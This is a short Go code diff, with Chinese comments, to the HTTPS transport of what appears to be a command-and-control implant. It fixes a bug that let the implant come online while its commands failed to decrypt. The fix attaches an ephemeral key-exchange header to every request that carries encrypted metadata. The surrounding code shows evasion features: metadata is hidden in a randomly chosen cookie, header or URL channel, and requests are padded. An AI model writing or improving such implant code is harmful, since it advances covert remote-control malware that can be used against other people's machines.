@@ -185,6 +185,11 @@ func (s *HTTPSClient) Connect(host string) error {
 
 // applyMetadata 将 metadata（MetaInfo）放入随机/配置的传输通道（cookie/header/url/auto）。
 func (s *HTTPSClient) applyMetadata(req *http.Request) {
+	// KX 头必须与元数据同生共死：服务端对每个 HTTPS 请求独立解析密钥，
+	// 凡是带 MetaInfo 的请求都必须同时带公钥，否则服务端回落静态密钥、
+	// 而 MetaInfo 是用派生密钥加密的 → 解不开（表现为能上线但命令全不通）。
+	s.applyKxHeader(req)
+
 	channel := config.MetadataChannel()
 	if channel == "auto" {
 		channel = []string{"cookie", "header", "url"}[rand.Intn(3)]
@@ -219,7 +224,7 @@ func (s *HTTPSClient) applyRequestPadding(req *http.Request) {
 	}
 }
 
-// applyKxHeader 把临时公钥放进请求头（握手成功后、FirstBlood 完成前都要带）
+// applyKxHeader 把临时公钥放进请求头。握手成功后**每个**带元数据的请求都要带 —— 服务端按请求独立解析密钥。
 func (s *HTTPSClient) applyKxHeader(req *http.Request) {
 	if s.kxPub != "" {
 		req.Header.Set(encrypt.KxHeaderName, s.kxPub)
@@ -278,7 +283,6 @@ func (s *HTTPSClient) getRaw() error {
 	}
 	req.Header.Set("User-Agent", config.UserAgent())
 	s.applyMetadata(req)
-	s.applyKxHeader(req)
 	s.applyRequestPadding(req)
 	resp, err := s.client.Do(req)
 	if err != nil {
